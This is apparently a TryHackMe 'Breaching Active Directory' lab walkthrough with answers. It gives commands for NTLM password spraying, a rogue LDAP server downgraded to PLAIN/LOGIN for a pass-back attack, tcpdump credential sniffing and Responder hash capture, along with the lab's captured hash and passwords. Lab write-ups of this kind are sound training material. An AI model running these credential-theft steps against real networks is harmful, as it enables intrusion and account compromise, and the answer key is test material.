
# Breaching Active Directory

## *Introduction to AD Breaches*

Ok, first of all, go to [Tryhackme Access page](https://tryhackme.com/access),
switch from "Machines" to "Networks" and choose "Breachingad" Network vpn server.
Download the config and use it to connect.

Next step is configuring DNS. If you are uing Linux, edit the ***/etc/systemd/resolved.conf***
file. First, switch to root:

```bash
$ su root
```

Then, edit file:

```bash
$ nano /etc/systemd/resolved.conf
```

It should look like this:

```bash
#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.
#
# Entries in this file show the compile time defaults.
# You can change settings by editing this file.
# Defaults can be restored by simply deleting this file.
#
# See resolved.conf(5) for details

[Resolve]
DNS=10.200.32.101
#FallbackDNS=
Domains=za.tryhackme.com
#LLMNR=no
#MulticastDNS=no
#DNSSEC=no
#DNSOverTLS=no
#Cache=no-negative
#DNSStubListener=yes
#ReadEtcHosts=yes
```

Save, and then do:

```bash
$ systemctl restart systemd-resolved
```

Verify that it has worked:

```bash
$ nslookup thmdc.za.tryhackme.com
```

You should see the following output:

```
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	thmdc.za.tryhackme.com
Address: 10.200.32.101
```

Ok, exit the root shell now and start hacking!

---

## *NTLM Authenticated Services*

- What is the name of the challenge-response authentication mechanism that uses NTLM?

> NetNTLM

Download the exploit provided by room author and move it to your working directory.
Execute following commands:

```bash
$ unzip passwordsprayer.zip

$ pip3 install requests_ntlm

$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/ | tee results.txt

$ cat results.txt | grep -e '\[+\]' > valid-creds.txt
```

Now we can answer the following questions:

- What is the username of the third valid credential pair found by the password spraying script?

```bash
$ nl valid-creds.txt | grep -e '^[[:space:]]\+3'
```

> gordon.stevens

- How many valid credentials pairs were found by the password spraying script?

```bash
$ cat valid-creds.txt | wc -l
```

> 4

- What is the message displayed by the web application when authenticating with a valid 
credential pair?

> Hello World

---

## *LDAP Bind Credentials*

First, install OpenLDAP:

```bash
$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

Then, configure it:

```bash
$ sudo dpkg-reconfigure -p low slapd
```

Press "No" when you're asked whether you want to skip LDAP configuration.

Next, move on to configuring!

1. For the DNS domain name, you want to provide our target domain, which is za.tryhackme.com
2. Provide the same domain as Organization name
3. Input admin password and confirm it
4. Select if you want the DB to be purged (I went with "No")
5. Select if you want the DB to be moved (I went with "Yes")
6. Make it accept credentials in plaintext. We want to ensure that our LDAP server only 
supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif 
file, called olcSaslSecProps.ldif with the following content

```bash
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

7. Apply this weak configuration:

```bash
$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
8. Verify that the configuration is indeed weak:

```bash
$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

You should see the following output:

```
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

### *Capturing LDAP Credentials*

Our rogue LDAP server has now been configured. When we click the "Test Settings" at http://printer.za.tryhackme.com/settings.aspx,
the authentication will occur in clear text. If you configured your rogue LDAP server 
correctly and it is downgrading the communication, you will receive the following error: 
"This distinguished name contains invalid syntax". If you receive this error, you can use 
tcpdump to capture the credentials using the following command:

First, setup tcpdump to sniff traffic on your network interface (For me, it was tun1):

```bash
$ sudo tcpdump -SX -i tun1 tcp port 389 | tee packets.pcap
```

- What type of attack can be performed against LDAP Authentication systems not commonly 
found against Windows Authentication systems?

> LDAP Pass-back Attacks

- What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the 
authentication and make it clear text?

> PLAIN, LOGIN

- What is the password associated with the svcLDAP account?

> tryhackmeldappass1@

---

## *Authentication Relays*

Start the responder on your tunX interface and leave it for a while. You should get this
in, like, 15 minutes:

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.200.32.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:36e5134be7afe356:6576AB3687711E77F6E7829A526E469A:010100000000000080E63C0F7A94D801EC39C9FBE89A8D6400000000020008003200320054004F0001001E00570049004E002D0045005A00450038003600530041004E00430044004C0004003400570049004E002D0045005A00450038003600530041004E00430044004C002E003200320054004F002E004C004F00430041004C00030014003200320054004F002E004C004F00430041004C00050014003200320054004F002E004C004F00430041004C000700080080E63C0F7A94D80106000400020000000800300030000000000000000000000000200000423D532CB734CAFD3A075C6B53AA4A64CBBC40D7B915444CB03FEC0806DA9D640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320039002E00340032000000000000000000
```

-  What is the name of the tool we can use to poison and capture authentication requests 
on the network?

> Responder

- What is the username associated with the challenge that was captured?

> svcFileCopy

- What is the value of the cracked password associated with the challenge that was 
captured?

> FPassword1!

---

## *Microsoft Deployment Toolkit*

- What Microsoft tool is used to create and host PXE Boot images in organisations?

> microsoft deployment toolkit

- What network protocol is used for recovery of files from the MDT server?

> tftp

- What is the username associated with the account that was stored in the PXE Boot image?

> svcMDT

- What is the password associated with the account that was stored in the PXE Boot image?

> PXEBootSecure1@

---

## *Configuration Files*

- What type of files often contain stored credentials on hosts?

> configuration files

- What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator?

> ma.db

- What table in this database stores the credentials of the orchestrator?

> AGENT_REPOSITORIES

- What is the username of the AD account associated with the McAfee service?

> svcAV

- What is the password of the AD account associated with the McAfee service?

> MyStrongPassword!

---
---
---

## **Cleanup**

Switch to root:

```bash
$ su root
```

Then, edit file:

```bash
$ nano /etc/systemd/resolved.conf
```

It should look like this:

```bash
#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.
#
# Entries in this file show the compile time defaults.
# You can change settings by editing this file.
# Defaults can be restored by simply deleting this file.
#
# See resolved.conf(5) for details

[Resolve]
#DNS=
#FallbackDNS=
#Domains=
#LLMNR=no
#MulticastDNS=no
#DNSSEC=no
#DNSOverTLS=no
#Cache=no-negative
#DNSStubListener=yes
#ReadEtcHosts=yes
```

Save, and then do:

```bash
$ systemctl restart systemd-resolved
```
